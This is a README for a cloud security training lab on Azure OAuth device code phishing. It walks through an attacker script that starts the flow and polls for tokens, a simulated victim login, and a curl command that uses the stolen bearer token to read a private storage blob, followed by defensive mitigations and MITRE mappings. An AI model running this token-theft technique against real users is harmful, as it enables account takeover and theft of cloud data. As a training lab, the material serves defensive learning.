# Device Code Phishing

**Provider:** Azure | **Category:** Identity / OAuth Phishing

## Scenario

Microsoft's OAuth **device code flow** was designed for input-constrained devices (smart TVs,
IoT, headless servers). An attacker can abuse it by initiating the flow themselves, then
socially engineering a victim into entering the one-time code at `microsoft.com/devicelogin`.
Once the victim authenticates, the attacker's waiting process receives a full access + refresh
token pair — no MFA required on the attacker's machine, and no password ever leaves the victim.

In this lab a victim user holds `Storage Blob Data Reader` on a private storage account.
Shared key access is disabled — the only way to read the blobs is via an Entra ID token.
Use the provided phishing tools to steal the victim's token, then read the flag.

## Tools

The lab ships two Python scripts in `tools/`:

| Script | Role | Description |
|---|---|---|
| `phish.py` | Attacker | Initiates device code flow, displays phishing message, polls for token |
| `victim_simulator.py` | Victim (automated) | Headless Playwright browser that enters the code and authenticates as the victim |

Both scripts run out of the box inside the Cumulonimbus Docker container —
Playwright and its Chromium dependencies are pre-installed.

## Attack Path

```
Terminal 1 (attacker)                Terminal 2 (victim simulator)
─────────────────────────────────    ──────────────────────────────────────────────
python3 phish.py --tenant <domain>
  → device code flow initiated
  → phishing message displayed
  → user_code: XXXXX-XXXXX
  → polling Azure AD...              python3 victim_simulator.py \
                                         --tenant <domain> \
                                         --code   XXXXX-XXXXX \
                                         --username victim@... \
                                         --password '...'
                                       → headless Chrome opens
                                       → navigates to devicelogin
                                       → enters code + victim credentials
                                       → auth complete ✓
  ← TOKEN CAPTURED
  ← /tmp/dcp_token.json saved
```

### Step 1 — Deploy the lab

```bash
cnimbus azure create --app-id device_code_phishing
```

Note the victim username, password, and storage account name from the output.

### Step 2 — Run the phishing tool (Terminal 1)

```bash
cd cumulonimbus/applications/azure/device_code_phishing/tools
python3 phish.py --tenant <tenant_domain>
```

The tool prints a phishing message containing the verification URL and user code.
Keep this terminal open — it polls Azure AD until the victim authenticates.

### Step 3 — Open a second terminal and simulate the victim

On your **host machine**, open a new terminal and attach to the running container:

```bash
docker exec -it cumulonimbus bash
```

Then run the victim simulator:

```bash
python3 victim_simulator.py \
    --tenant   <tenant_domain> \
    --code     <USER_CODE_from_Terminal_1> \
    --username <victim_username> \
    --password '<victim_password>'
```

The simulator uses a headless Chromium browser to navigate to `microsoft.com/devicelogin`,
enter the user code, and authenticate as the victim. Once complete, Terminal 1 receives
the access token.

### Step 4 — Read the flag

```bash
TOKEN=$(python3 -c "
import json
d = json.load(open('/tmp/dcp_token.json'))
print(d['access_token'])
")

curl -s \
  -H "Authorization: Bearer $TOKEN" \
  -H "x-ms-version: 2020-04-08" \
  "https://<storage_account>.blob.core.windows.net/sensitive-data/flag.txt"
```

## How to Fix in Production

1. **Block device code flow via Conditional Access** — in the Authentication flows policy,
   set *Device code flow* to **Block** for all users who don't need it.
2. **Phishing-resistant MFA (FIDO2 / passkeys)** — device code phishing succeeds because
   standard MFA (SMS, Authenticator push) can be completed inside the phishing flow.
   FIDO2 keys are origin-bound and cannot be replayed.
3. **Continuous Access Evaluation (CAE)** — limits the lifetime of stolen tokens and revokes
   them when the victim's session state changes.
4. **Monitor device code sign-in events** — alert on `DeviceCodeSignIn` sign-in events in
   Entra ID logs, especially from users who don't regularly authenticate from input-constrained
   devices or from unfamiliar locations.
5. **Token theft detection** — Defender for Identity and Microsoft Sentinel have rules
   specifically for impossible-travel and unfamiliar-sign-in patterns that follow device code
   phishing campaigns.

## MITRE ATT&CK Mapping

| Technique ID | Technique Name | Tactic |
|---|---|---|
| [T1528](https://attack.mitre.org/techniques/T1528/) | Steal Application Access Token | Credential Access |
| [T1566](https://attack.mitre.org/techniques/T1566/) | Phishing | Initial Access |
| [T1530](https://attack.mitre.org/techniques/T1530/) | Data from Cloud Storage | Collection |
| [T1078.004](https://attack.mitre.org/techniques/T1078/004/) | Valid Accounts: Cloud Accounts | Defense Evasion |
